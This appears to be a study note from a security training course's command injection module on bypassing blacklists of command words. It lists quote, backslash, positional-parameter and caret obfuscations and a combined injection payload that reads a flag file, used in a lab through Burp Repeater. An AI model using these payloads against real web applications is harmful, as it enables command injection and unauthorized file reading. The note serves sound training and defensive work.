## ID
533

## Module
Command Injections

## Kind
notes

## Title
Section 8 — Bypassing Blacklisted Commands

## Description
Covers command obfuscation techniques to bypass word-based command blacklists using quote insertion, backslash insertion, and positional parameters.

## Tags
command-injection, filter-evasion, command-obfuscation, quotes, blacklist-bypass

## Commands
- `w'h'o'am'i` — single-quote insertion (Linux + Windows)
- `w"h"o"am"i` — double-quote insertion (Linux + Windows)
- `who$@ami` — positional parameter insertion (Linux only)
- `w\ho\am\i` — backslash insertion (Linux only)
- `who^ami` — caret insertion (Windows CMD only)
- `127.0.0.1%0a%09c'a't%09${PATH:0:1}home${PATH:0:1}<USER>${PATH:0:1}flag.txt` — full payload combining all bypasses

## What This Section Covers
When a web application blacklists specific command words (e.g., `whoami`, `cat`, `ls`), the filter does exact string matching against user input. By inserting characters that the shell ignores during execution — quotes, backslashes, or positional parameters — the command looks different to the filter but executes identically in the shell.

## Methodology
1. Confirm that the command itself is blocked: `127.0.0.1%0a%09whoami` → "Invalid input" (space and operator bypasses work, but the command word triggers the filter).
2. Obfuscate the command using one of these techniques:
   - **Quotes (Linux + Windows):** `w'h'o'am'i` or `w"h"o"am"i` — don't mix quote types, keep count even.
   - **Backslash (Linux only):** `w\ho\am\i` — any position, any count.
   - **Positional parameter (Linux only):** `who$@ami` — `$@` expands to nothing inside a word.
   - **Caret (Windows CMD only):** `who^ami`.
3. Combine with all previous bypasses for a full payload:
   - Operator: `%0a`
   - Space: `%09` or `${IFS}`
   - Slash: `${PATH:0:1}`
   - Command: `c'a't` or `c\at`
4. Example full chain to read a file: `127.0.0.1%0a%09c'a't%09${PATH:0:1}home${PATH:0:1}<USER>${PATH:0:1}flag.txt`

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Content of flag.txt in user's home folder | (answered correctly) | Full payload: `127.0.0.1%0a%09c'a't%09${PATH:0:1}home${PATH:0:1}<USER>${PATH:0:1}flag.txt` in Burp Repeater |

## Key Takeaways
- Command blacklists do **exact string matching** — any alteration to the command word defeats them.
- Single/double quotes are the most portable bypass — they work on both Linux and Windows.
- The number of quotes must be **even**, and you **cannot mix** single and double quotes in the same command word.
- Backslash and `$@` are Linux-only but don't require even counts — more flexible for quick use.
- This section is where all previous bypasses stack: operator (`%0a`) + space (`%09`) + character (`${PATH:0:1}`) + command obfuscation (`c'a't`) = full exploit chain.

## Gotchas
- If `$` is blacklisted, `$@` and `${PATH:0:1}` won't work — you'd need to fall back to character shifting or other techniques.
- Backslash `\` may itself be blacklisted — test it in isolation first before using `w\hoami`.
- PHP's `strpos()` blacklist is case-sensitive: `WHOAMI` might bypass it, but Linux commands are case-sensitive too so `WHOAMI` won't execute (unlike Windows where it would).
